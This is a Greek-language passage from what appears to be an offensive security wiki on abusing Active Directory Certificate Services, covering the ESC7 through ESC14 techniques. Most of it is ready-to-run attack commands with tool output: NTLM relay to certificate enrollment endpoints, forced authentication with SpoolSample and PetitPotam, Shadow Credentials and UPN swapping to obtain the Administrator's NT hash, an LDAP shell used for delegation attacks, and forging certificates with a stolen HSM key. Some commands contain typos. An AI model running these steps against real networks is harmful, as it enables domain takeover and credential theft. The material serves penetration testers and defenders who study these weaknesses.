Εν ολίγοις, το *Manage Certificates* — που προηγουμένως θεωρούνταν το «λιγότερο ισχυρό» μισό του ESC7 — μπορεί τώρα να αξιοποιηθεί για πλήρη ανύψωση προνομίων ή μακροχρόνια επιμονή, χωρίς να αγγίξει την παραμετροποίηση του CA ή να απαιτήσει το πιο περιοριστικό δικαίωμα *Manage CA*.

#### Κατάχρηση του primitive με Certify 2.0

1. **Υποβάλετε ένα certificate request που θα παραμείνει *pending*.** Αυτό μπορεί να εξαναγκαστεί με ένα template που απαιτεί manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Προσθέστε μια custom extension στο pending request** χρησιμοποιώντας την καινούρια εντολή `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Αν το template δεν ορίζει ήδη την επέκταση *Certificate Issuance Policies*, η παραπάνω τιμή θα διατηρηθεί μετά την έκδοση.*

3. **Εκδώστε την αίτηση** (αν ο ρόλος σας έχει επίσης δικαιώματα έγκρισης *Manage Certificates*) ή περιμένετε έναν χειριστή να την εγκρίνει. Μόλις εκδοθεί, κατεβάστε το πιστοποιητικό:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Το προκύπτον πιστοποιητικό τώρα περιέχει το κακόβουλο issuance-policy OID και μπορεί να χρησιμοποιηθεί σε επακόλουθες επιθέσεις (π.χ. ESC13, domain escalation, κ.λπ.).

> ΣΗΜΕΙΩΣΗ: Η ίδια επίθεση μπορεί να εκτελεστεί με Certipy ≥ 4.7 μέσω της εντολής `ca` και της παραμέτρου `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Επεξήγηση

> [!TIP]
> Σε περιβάλλοντα όπου **AD CS is installed**, εάν υπάρχει ένα **ευπαθές web enrollment endpoint** και τουλάχιστον ένα **certificate template is published** που επιτρέπει **domain computer enrollment and client authentication** (όπως το προεπιλεγμένο **`Machine`** template), γίνεται δυνατό για **οποιονδήποτε υπολογιστή με ενεργή την spooler service να υποκλέπτεται από επιτιθέμενο**!

Πολλές μέθοδοι enrollment βάσει HTTP υποστηρίζονται από το AD CS, διαθέσιμες μέσω επιπλέον server roles που οι διαχειριστές μπορεί να εγκαταστήσουν. Αυτές οι διεπιφάνειες για HTTP-based certificate enrollment είναι ευάλωτες σε NTLM relay attacks. Ένας επιτιθέμενος, από έναν compromised machine, μπορεί να μιμηθεί οποιονδήποτε AD account που αυθεντικοποιείται μέσω εισερχόμενου NTLM. Ενώ μιμείται το θύμα, ο επιτιθέμενος μπορεί να προσπελάσει αυτές τις web διεπιφάνειες για να ζητήσει ένα client authentication certificate χρησιμοποιώντας τα `User` ή `Machine` certificate templates.

- Η **web enrollment interface** (μια παλαιότερη ASP εφαρμογή διαθέσιμη στο `http://<caserver>/certsrv/`), εξ ορισμού χρησιμοποιεί μόνο HTTP, το οποίο δεν προσφέρει προστασία έναντι NTLM relay attacks. Επιπλέον, επιτρέπει ρητά μόνο NTLM authentication μέσω του Authorization HTTP header, καθιστώντας πιο ασφαλείς μεθόδους όπως το Kerberos μη εφαρμόσιμες.
- Η **Certificate Enrollment Service** (CES), το **Certificate Enrollment Policy** (CEP) Web Service, και η **Network Device Enrollment Service** (NDES) υποστηρίζουν εξ ορισμού negotiate authentication μέσω του Authorization HTTP header. Το negotiate authentication υποστηρίζει τόσο Kerberos όσο και **NTLM**, επιτρέποντας σε έναν επιτιθέμενο να υποβαθμίσει την αυθεντικοποίηση σε NTLM κατά τη διάρκεια relay attacks. Παρότι αυτές οι web υπηρεσίες ενεργοποιούν HTTPS ως προεπιλογή, μόνο το HTTPS δεν προστατεύει από NTLM relay attacks. Η προστασία από NTLM relay attacks για HTTPS υπηρεσίες είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με channel binding. Δυστυχώς, το AD CS δεν ενεργοποιεί το Extended Protection for Authentication στο IIS, που απαιτείται για channel binding.

Ένα κοινό ζήτημα με τα NTLM relay attacks είναι η μικρή διάρκεια των NTLM sessions και η αδυναμία του επιτιθέμενου να αλληλεπιδράσει με υπηρεσίες που απαιτούν NTLM signing.

Ωστόσο, αυτός ο περιορισμός ξεπερνιέται εκμεταλλευόμενος ένα NTLM relay attack για την απόκτηση ενός πιστοποιητικού για τον χρήστη, καθώς η διάρκεια ισχύος του πιστοποιητικού καθορίζει τη διάρκεια της σύνδεσης, και το πιστοποιητικό μπορεί να χρησιμοποιηθεί με υπηρεσίες που απαιτούν NTLM signing. Για οδηγίες σχετικά με τη χρήση ενός κλεμμένου πιστοποιητικού, ανατρέξτε στο:


{{#ref}}
account-persistence.md
{{#endref}}

Ένας άλλος περιορισμός των NTLM relay attacks είναι ότι μια attacker-controlled machine πρέπει να λάβει authentication από έναν victim account. Ο επιτιθέμενος μπορεί είτε να περιμένει είτε να προσπαθήσει να αναγκάσει αυτή την authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Κατάχρηση**

Η `cas` του [**Certify**](https://github.com/GhostPack/Certify) απαριθμεί τα **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από τις εταιρικές Certificate Authorities (CAs) για να αποθηκεύει τα endpoints του Certificate Enrollment Service (CES). Αυτά τα endpoints μπορούν να αναλυθούν και να απαριθμηθούν χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με [Certipy](https://github.com/ly4k/Certipy)

Το αίτημα για πιστοποιητικό γίνεται από το Certipy εξ ορισμού βάσει του προτύπου `Machine` ή `User`, που καθορίζεται από το αν το όνομα λογαριασμού που αναμεταδίδεται τελειώνει σε `$`.  

Ο καθορισμός εναλλακτικού προτύπου μπορεί να γίνει με τη χρήση της παραμέτρου `-template`.

Μια τεχνική όπως [PetitPotam](https://github.com/ly4k/PetitPotam) μπορεί στη συνέχεια να χρησιμοποιηθεί για να εξαναγκάσει την αυθεντικοποίηση. Όταν πρόκειται για ελεγκτές τομέα, απαιτείται ο καθορισμός του `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Καμία επέκταση ασφαλείας - ESC9 <a href="#id-5485" id="id-5485"></a>

### Επεξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, αναφερόμενη ως ESC9, αποτρέπει την ενσωμάτωση της **νέας `szOID_NTDS_CA_SECURITY_EXT` επέκτασης ασφαλείας** σε ένα πιστοποιητικό. Αυτό το flag γίνεται σημαντικό όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο σε `1` (η προεπιλεγμένη ρύθμιση), σε αντίθεση με τη ρύθμιση `2`. Η σημασία του ενισχύεται σε σενάρια όπου μια ασθενέστερη αντιστοίχιση πιστοποιητικού για Kerberos ή Schannel μπορεί να εκμεταλλευτεί (όπως στο ESC10), δεδομένου ότι η απουσία του ESC9 δεν θα άλλαζε τις απαιτήσεις.

Οι συνθήκες υπό τις οποίες η ρύθμιση αυτού του flag γίνεται σημαντική περιλαμβάνουν:

- Το `StrongCertificateBindingEnforcement` δεν έχει προσαρμοστεί σε `2` (με προεπιλογή το `1`), ή το `CertificateMappingMethods` περιλαμβάνει το flag `UPN`.
- Το πιστοποιητικό έχει επισημανθεί με το flag `CT_FLAG_NO_SECURITY_EXTENSION` μέσα στη ρύθμιση `msPKI-Enrollment-Flag`.
- Κάθε client authentication EKU καθορίζεται από το πιστοποιητικό.
- Δικαιώματα `GenericWrite` είναι διαθέσιμα πάνω σε οποιονδήποτε λογαριασμό για να παραβιαστεί άλλος.

### Σενάριο Κατάχρησης

Ας υποθέσουμε ότι ο `John@corp.local` έχει δικαιώματα `GenericWrite` πάνω στον `Jane@corp.local`, με στόχο να παραβιάσει τον `Administrator@corp.local`. Το πρότυπο πιστοποιητικού `ESC9`, στο οποίο επιτρέπεται στον `Jane@corp.local` να εγγραφεί, είναι ρυθμισμένο με το flag `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, το hash της `Jane` αποκτάται χρησιμοποιώντας Shadow Credentials, χάρη στο `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, εσκεμμένα παραλείποντας το τμήμα domain `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, δεδομένου ότι το `Administrator@corp.local` παραμένει ξεχωριστό ως `Administrator`'s `userPrincipalName`.

Κατόπιν τούτου, το πρότυπο πιστοποιητικού `ESC9`, επισημασμένο ως ευάλωτο, ζητείται ως `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του πιστοποιητικού αντανακλά τον `Administrator`, χωρίς κανένα “object SID”.

Το `userPrincipalName` της `Jane` επανέρχεται στην αρχική της τιμή, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια αυθεντικοποίησης με το εκδοθέν πιστοποιητικό τώρα αποδίδει το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει `-domain <domain>` λόγω της έλλειψης καθορισμού domain στο πιστοποιητικό:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Αδύναμες αντιστοιχίσεις πιστοποιητικών - ESC10

### Επεξήγηση

Δύο τιμές κλειδιών μητρώου στον domain controller αναφέρονται από το ESC10:

- Η προεπιλεγμένη τιμή για `CertificateMappingMethods` κάτω από `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), προηγουμένως ρυθμισμένη σε `0x1F`.
- Η προεπιλεγμένη ρύθμιση για `StrongCertificateBindingEnforcement` κάτω από `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, προηγουμένως `0`.

**Περίπτωση 1**

Όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο σε `0`.

**Περίπτωση 2**

Αν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Περίπτωση Κατάχρησης 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο σε `0`, ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να εκμεταλλευτεί για να παραβιάσει οποιονδήποτε λογαριασμό B.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` στον λογαριασμό `Jane@corp.local`, ένας επιτιθέμενος στοχεύει να παραβιάσει τον `Administrator@corp.local`. Η διαδικασία είναι παρόμοια με το ESC9, επιτρέποντας τη χρήση οποιουδήποτε template πιστοποιητικού.

Αρχικά, το hash της Jane ανακτάται χρησιμοποιώντας Shadow Credentials, εκμεταλλευόμενο το `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` αλλάζεται σε `Administrator`, εσκεμμένα παραλείποντας το τμήμα `@corp.local` για να αποφευχθεί μια παραβίαση περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Κατόπιν αυτού, ζητείται ένα πιστοποιητικό που επιτρέπει την πιστοποίηση πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` στη συνέχεια επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η αυθεντικοποίηση με το αποκτηθέν πιστοποιητικό θα αποδώσει το NT hash του `Administrator@corp.local`, καθιστώντας απαραίτητο τον καθορισμό του domain στην εντολή λόγω της έλλειψης στοιχείων του domain στο πιστοποιητικό.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Περίπτωση Κατάχρησης 2

Όταν το `CertificateMappingMethods` περιέχει το bit flag `UPN` (`0x4`), ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να συμβιβάσει οποιονδήποτε λογαριασμό B που δεν έχει την ιδιότητα `userPrincipalName`, συμπεριλαμβανομένων των machine accounts και του built-in domain administrator `Administrator`.

Εδώ, ο στόχος είναι να συμβιβαστεί ο `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash της `Jane` μέσω Shadow Credentials, αξιοποιώντας το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Το `userPrincipalName` της `Jane` στη συνέχεια ορίζεται σε `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ένα πιστοποιητικό για αυθεντικοποίηση πελάτη ζητείται ως `Jane` χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` επανέρχεται στην αρχική του τιμή μετά από αυτή τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για να γίνει authenticate μέσω Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, υποδεικνύοντας επιτυχή authentication ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP shell, εντολές όπως `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), ενδεχομένως θέτοντας σε κίνδυνο τον domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια εκτείνεται επίσης σε οποιονδήποτε λογαριασμό χρήστη που δεν διαθέτει `userPrincipalName` ή όπου αυτό δεν αντιστοιχεί στο `sAMAccountName`, με τον προεπιλεγμένο `Administrator@corp.local` να αποτελεί βασικό στόχο λόγω των αυξημένων LDAP προνομίων του και της απουσίας `userPrincipalName` από προεπιλογή.

## Μεταβίβαση NTLM σε ICPR - ESC11

### Εξήγηση

Εάν ο CA Server δεν είναι διαμορφωμένος με `IF_ENFORCEENCRYPTICERTREQUEST`, αυτό μπορεί να επιτρέψει NTLM relay attacks χωρίς υπογραφή μέσω της υπηρεσίας RPC. [Αναφορά εδώ](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Μπορείτε να χρησιμοποιήσετε το `certipy` για να ελέγξετε αν το `Enforce Encryption for Requests` είναι απενεργοποιημένο και το `certipy` θα εμφανίσει ευπάθειες `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Σενάριο Κατάχρησης

Χρειάζεται να εγκατασταθεί ένας relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Σημείωση: Για domain controllers, πρέπει να καθορίσουμε το `-template` στο DomainController.

Ή χρησιμοποιώντας [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Επεξήγηση

Οι διαχειριστές μπορούν να ρυθμίσουν την Certificate Authority ώστε να αποθηκεύεται σε μια εξωτερική συσκευή όπως το "Yubico YubiHSM2".

Εάν μια USB συσκευή είναι συνδεδεμένη στον CA server μέσω θύρας USB, ή σε USB device server στην περίπτωση που ο CA server είναι virtual machine, απαιτείται ένα authentication key (μερικές φορές αναφερόμενο ως "password") για τον Key Storage Provider ώστε να δημιουργεί και να χρησιμοποιεί κλειδιά στο YubiHSM.

Αυτό το key/password αποθηκεύεται στο registry κάτω από `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` σε απλό κείμενο.

Αναφορά [εδώ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Σενάριο Κατάχρησης

Εάν το ιδιωτικό κλειδί της CA είναι αποθηκευμένο σε φυσική USB συσκευή και αποκτήσετε shell access, είναι πιθανό να ανακτήσετε το κλειδί.

Πρώτα, πρέπει να αποκτήσετε το CA certificate (αυτό είναι δημόσιο) και στη συνέχεια:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Τέλος, χρησιμοποιήστε την εντολή certutil `-sign` για να forge ένα νέο αυθαίρετο πιστοποιητικό χρησιμοποιώντας το πιστοποιητικό CA και το ιδιωτικό του κλειδί.

## OID Group Link Abuse - ESC13

### Εξήγηση

Το attribute `msPKI-Certificate-Policy` επιτρέπει την προσθήκη της πολιτικής έκδοσης στο πρότυπο πιστοποιητικού. Τα αντικείμενα `msPKI-Enterprise-Oid` που είναι υπεύθυνα για την έκδοση πολιτικών μπορούν να εντοπιστούν στο Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) του PKI OID container. Μια policy μπορεί να συνδεθεί με μια ομάδα AD χρησιμοποιώντας το attribute `msDS-OIDToGroupLink` αυτού του αντικειμένου, επιτρέποντας σε ένα σύστημα να εξουσιοδοτήσει έναν χρήστη που παρουσιάζει το πιστοποιητικό σαν να ήταν μέλος της ομάδας. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Με άλλα λόγια, όταν ένας χρήστης έχει άδεια να enroll ένα πιστοποιητικό και το πιστοποιητικό είναι linked σε μια OID group, ο χρήστης μπορεί να κληρονομήσει τα προνόμια αυτής της ομάδας.

Χρησιμοποιήστε [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) για να βρείτε OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Σενάριο Κατάχρησης

Εντοπίστε μια άδεια χρήστη που μπορείτε να χρησιμοποιήσετε με `certipy find` ή `Certify.exe find /showAllPermissions`.

Αν ο χρήστης `John` έχει άδεια να εγγραφεί στο `VulnerableTemplate`, ο χρήστης μπορεί να κληρονομήσει τα προνόμια της ομάδας `VulnerableGroup`.

Το μόνο που χρειάζεται να κάνει είναι να καθορίσει το πρότυπο — θα λάβει ένα πιστοποιητικό με δικαιώματα OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ευάλωτη Διαμόρφωση Ανανέωσης Πιστοποιητικού - ESC14

### Εξήγηση

Η περιγραφή στο https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping είναι εξαιρετικά λεπτομερής. Παρακάτω υπάρχει απόσπασμα του αρχικού κειμένου.

Το ESC14 αντιμετωπίζει ευπάθειες που προκύπτουν από "weak explicit certificate mapping", κυρίως μέσω της κατάχρησης ή της ανασφαλούς διαμόρφωσης του χαρακτηριστικού `altSecurityIdentities` σε λογαριασμούς χρήστη ή υπολογιστή στο Active Directory. Αυτό το πολυτιμης/πολλαπλών τιμών attribute επιτρέπει στους διαχειριστές να συσχετίσουν χειροκίνητα πιστοποιητικά X.509 με έναν λογαριασμό AD για σκοπούς πιστοποίησης. Όταν είναι συμπληρωμένο, αυτές οι explicit mappings μπορούν να παρακάμψουν τη προεπιλεγμένη λογική αντιστοίχισης πιστοποιητικών, η οποία τυπικά βασίζεται σε UPNs ή DNS names στο SAN του πιστοποιητικού, ή στο SID που είναι ενσωματωμένο στην `szOID_NTDS_CA_SECURITY_EXT` security extension.

Μια "weak" αντιστοίχιση συμβαίνει όταν η string τιμή που χρησιμοποιείται μέσα στο `altSecurityIdentities` attribute για να ταυτοποιήσει ένα πιστοποιητικό είναι πολύ γενική, εύκολα εικασίσιμη, βασίζεται σε μη μονοσήμαντα πεδία πιστοποιητικού, ή χρησιμοποιεί εύκολα παραποιήσιμα συστατικά του πιστοποιητικού. Εάν ένας επιτιθέμενος μπορεί να αποκτήσει ή να κατασκευάσει ένα πιστοποιητικό του οποίου τα attributes ταιριάζουν με μια τέτοια αδύναμα ορισμένη explicit mapping για έναν privileged λογαριασμό, μπορεί να χρησιμοποιήσει αυτό το πιστοποιητικό για να πιστοποιηθεί ως και να προσποιηθεί ότι είναι ο εν λόγω λογαριασμός.

Παραδείγματα ενδεχομένως αδύναμων `altSecurityIdentities` mapping strings περιλαμβάνουν:

- Mapping solely by a common Subject Common Name (CN): π.χ., `X509:<S>CN=SomeUser`. Ένας επιτιθέμενος μπορεί να είναι σε θέση να αποκτήσει ένα πιστοποιητικό με αυτό το CN από κάποια λιγότερο ασφαλή πηγή.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: π.χ., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

Το `altSecurityIdentities` attribute υποστηρίζει διάφορες μορφές για την αντιστοίχιση, όπως:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

Η ασφάλεια αυτών των mappings εξαρτάται σε μεγάλο βαθμό από τη συγκεκριμενοποίηση, τη μοναδικότητα και την κρυπτογραφική ισχύ των επιλεγμένων ταυτοποιητών πιστοποιητικού που χρησιμοποιούνται στο mapping string. Ακόμα και με ενεργοποιημένα strong certificate binding modes στους Domain Controllers (που επηρεάζουν κυρίως implicit mappings βασισμένα σε SAN UPNs/DNS και την SID extension), μια κακώς διαμορφωμένη καταχώρηση `altSecurityIdentities` μπορεί εξακολουθητικά να παρέχει άμεσο δρόμο για impersonation αν η ίδια η λογική αντιστοίχισης είναι ελαττωματική ή υπερβολικά επιεικής.

### Σενάριο Κατάχρησης

Το ESC14 στοχεύει τις **explicit certificate mappings** στο Active Directory (AD), συγκεκριμένα το χαρακτηριστικό `altSecurityIdentities`. Εάν αυτό το attribute είναι ρυθμισμένο (επί τούτου ή από λάθος διαμόρφωση), οι επιτιθέμενοι μπορούν να προσποιηθούν λογαριασμούς παρουσιάζοντας πιστοποιητικά που ταιριάζουν με την αντιστοίχιση.

#### Σενάριο A: Ο επιτιθέμενος μπορεί να γράψει στο `altSecurityIdentities`

**Προϋπόθεση**: Ο επιτιθέμενος έχει δικαιώματα εγγραφής στο `altSecurityIdentities` attribute του στοχευόμενου λογαριασμού ή το δικαίωμα να το παραχωρήσει με τη μορφή ενός από τα ακόλουθα permissions στο αντικείμενο AD στόχο:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Σενάριο B: Ο στόχος έχει αδύναμη αντιστοίχιση μέσω X509RFC822 (Email)

- **Προϋπόθεση**: Ο στόχος έχει μια αδύναμη X509RFC822 mapping στο altSecurityIdentities. Ένας επιτιθέμενος μπορεί να ορίσει το attribute mail του θύματος ώστε να ταιριάξει με το X509RFC822 όνομα του στόχου, να εγγράψει ένα πιστοποιητικό ως το θύμα, και να το χρησιμοποιήσει για να πιστοποιηθεί ως ο στόχος.

#### Σενάριο C: Ο στόχος έχει X509IssuerSubject mapping

- **Προϋπόθεση**: Ο στόχος έχει μια αδύναμη X509IssuerSubject explicit mapping στο `altSecurityIdentities`. Ο επιτιθέμενος μπορεί να ορίσει το `cn` ή το `dNSHostName` attribute σε ένα principal θύμα ώστε να ταιριάξει με το subject της X509IssuerSubject mapping του στόχου. Στη συνέχεια, ο επιτιθέμενος μπορεί να εγγράψει ένα πιστοποιητικό ως το θύμα και να χρησιμοποιήσει αυτό το πιστοποιητικό για να πιστοποιηθεί ως ο στόχος.

#### Σενάριο D: Ο στόχος έχει X509SubjectOnly mapping

- **Προϋπόθεση**: Ο στόχος έχει μια αδύναμη X509SubjectOnly explicit mapping στο `altSecurityIdentities`. Ο επιτιθέμενος μπορεί να ορίσει το `cn` ή το `dNSHostName` attribute σε ένα principal θύμα ώστε να ταιριάξει με το subject της X509SubjectOnly mapping του στόχου. Στη συνέχεια, ο επιτιθέμενος μπορεί να εγγράψει ένα πιστοποιητικό ως το θύμα και να χρησιμοποιήσει αυτό το πιστοποιητικό για να πιστοποιηθεί ως ο στόχος.

### Συγκεκριμένες ενέργειες
#### Σενάριο A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Αποθήκευση και μετατροπή του πιστοποιητικού
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Αυθεντικοποίηση (χρησιμοποιώντας το πιστοποιητικό)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Καθαρισμός (προαιρετικό)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
